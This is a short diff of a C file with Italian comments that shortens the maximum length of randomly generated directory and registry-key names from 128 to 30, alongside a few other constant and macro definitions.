@@ -20,7 +20,7 @@
 
 #define EXPORTED_FUNC "PPPFTBBP09"
 #define WRAPPER_COUNT 14 // XXX Da cambiare se aggiungo un wrapper
-#define MAX_RAND_NAME 128 // lunghezza massima dei nomi di directory/chiavi registry
+#define MAX_RAND_NAME 30 // lunghezza massima dei nomi di directory/chiavi registry
 
 #define IF_SAME_STRING(x,y,z) BOOL is_equal;\
 	                      is_equal = TRUE;\
